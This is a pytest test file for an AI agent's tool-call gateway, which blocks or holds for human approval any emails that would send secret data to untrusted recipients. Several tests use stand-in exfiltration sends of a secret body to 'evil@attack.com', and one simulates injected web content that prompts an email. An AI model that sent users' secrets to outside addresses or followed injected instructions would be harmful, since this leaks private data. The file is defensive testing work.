import pytest
import json
from gateway import Gateway
from policy import Policy
from models import Facts, UNTRUSTED, SECRET
from tests.fakes import FakeMatcher, FakeDetector, fake_tools

def test_secret_to_untrusted_blocked():
    tools, outbox = fake_tools()
    facts = Facts(recipient_untrusted=True, body_secret=True, recipient_in_allowlist=False)
    gw = Gateway(tools, FakeMatcher(facts), Policy(), FakeDetector(), enabled=True)
    
    res = gw.call("send_email", to="evil@attack.com", subject="Hi", body="Secret")
    assert "BLOCKED" in res
    assert len(outbox) == 0

def test_tripwire_off_leaks():
    tools, outbox = fake_tools()
    facts = Facts(body_secret=True, recipient_in_allowlist=False)
    gw = Gateway(tools, FakeMatcher(facts), Policy(), FakeDetector(), enabled=False)
    
    gw.call("send_email", to="evil@attack.com", subject="Hi", body="Secret")
    assert len(outbox) == 1

def test_allowlist_passes():
    tools, outbox = fake_tools()
    facts = Facts(body_secret=True, recipient_in_allowlist=True)
    gw = Gateway(tools, FakeMatcher(facts), Policy(), FakeDetector(), enabled=True)
    
    gw.call("send_email", to="accountant@company.com", subject="Hi", body="Secret")
    assert len(outbox) == 1

def test_ask_approve_deny():
    tools, outbox = fake_tools()
    facts = Facts(recipient_untrusted=True, recipient_in_allowlist=False)
    gw = Gateway(tools, FakeMatcher(facts), Policy(), FakeDetector(), enabled=True)
    
    res = gw.call("send_email", to="ask@test.com", subject="Hi", body="Txt")
    pid = res[18:-1]
    gw.resolve(pid, approve=True)
    assert len(outbox) == 1
    
    res2 = gw.call("send_email", to="deny@test.com", subject="Hi", body="Txt")
    pid2 = res2[18:-1]
    assert gw.resolve(pid2, approve=False) == "[DENIED]"
    assert len(outbox) == 1

def test_resolve_edge_cases():
    tools, _ = fake_tools()
    gw = Gateway(tools, FakeMatcher(), Policy(), FakeDetector())
    assert gw.resolve("invalid", True) == "[UNKNOWN APPROVAL ID]"
    
    res = gw.call("send_email", to="a@b.com", subject="s", body="b")
    if "PENDING" in str(res):
        pid = res[18:-1]
        gw.resolve(pid, True)
        assert gw.resolve(pid, True) == "[UNKNOWN APPROVAL ID]"

def test_unknown_tool():
    tools, _ = fake_tools()
    gw = Gateway(tools, FakeMatcher(), Policy(), FakeDetector())
    assert gw.call("ghost_tool") == "[UNKNOWN TOOL: ghost_tool]"

def test_source_labeling():
    tools, _ = fake_tools()
    gw = Gateway(tools, FakeMatcher(), Policy(), FakeDetector(), sensitive_files=('secret.txt',))
    
    gw.call("read_email", id="1")
    assert len(gw.labels.with_label(UNTRUSTED)) == 1
    
    gw.call("read_file", name="secret.txt")
    assert len(gw.labels.with_label(SECRET)) == 1

def test_injection_trigger():
    tools, outbox = fake_tools()
    facts = Facts(untrusted_in_context=True, recipient_in_allowlist=False)
    gw = Gateway(tools, FakeMatcher(facts), Policy(), FakeDetector(0.9), enabled=True)
    
    gw.labels.add("malicious payload", "web", untrusted=True)
    
    res = gw.call("send_email", to="target@test.com", subject="Hi", body="Txt")
    assert "PENDING_APPROVAL" in res
    assert gw.log[-1]["rule"] == "R3"

def test_matcher_exception_fail_closed():
    tools, outbox = fake_tools()
    class CrashingMatcher:
        def derive_facts(self, *args): raise RuntimeError("Crash")
    
    gw = Gateway(tools, CrashingMatcher(), Policy(), FakeDetector(), enabled=True)
    res = gw.call("send_email", to="a@b.com", subject="s", body="b")
    assert "BLOCKED" in res
    assert "ERROR" in gw.log[-1]["rule"]
    assert len(outbox) == 0

def test_log_json_serializable():
    tools, _ = fake_tools()
    gw = Gateway(tools, FakeMatcher(), Policy(), FakeDetector())
    gw.call("send_email", to="a@b.com", subject="s", body="b")
    
    for record in gw.log:
        json.dumps(record)
